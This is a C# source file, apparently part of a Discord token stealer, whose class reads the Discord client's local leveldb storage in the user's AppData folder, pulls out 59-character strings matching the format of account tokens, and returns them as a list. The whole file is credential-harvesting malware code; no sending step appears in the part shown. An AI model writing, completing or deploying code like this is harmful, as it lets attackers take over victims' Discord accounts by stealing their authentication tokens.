namespace Zeuratis;

partial class Discord
{
    public static String GetToken()
    {
        return LogTokenString();
    }

    private static List<String> SearchForFile()
    {
        List<String> ldbFiles = new();
        String discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

        if (!Directory.Exists(discordPath))
        {
            return ldbFiles;
        }

        foreach (String file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
        {
            String rawText = File.ReadAllText(file);
            if (rawText.Contains("oken"))
            {
                ldbFiles.Add(rawText);
            }
        }
        return ldbFiles;
    }

    private static String LogTokenString()
    {
        String[] tokenArr = new String[32];
        String token = "";

        var files = SearchForFile();
        if (files.Count == 0)
        {
            return token;
        }

        int i = 0;
        foreach (String fetoken in files)
        {
            foreach (Match match in Regex.Matches(fetoken, "[^\"]*"))
            {
                if (match.Length == 59)
                {
                    tokenArr[i] = match.ToString();
                    i++;
                }
            }
        }

        foreach (String fetoken in tokenArr)
        {
            token += fetoken + "\n";
        }

        return token;
    }
}
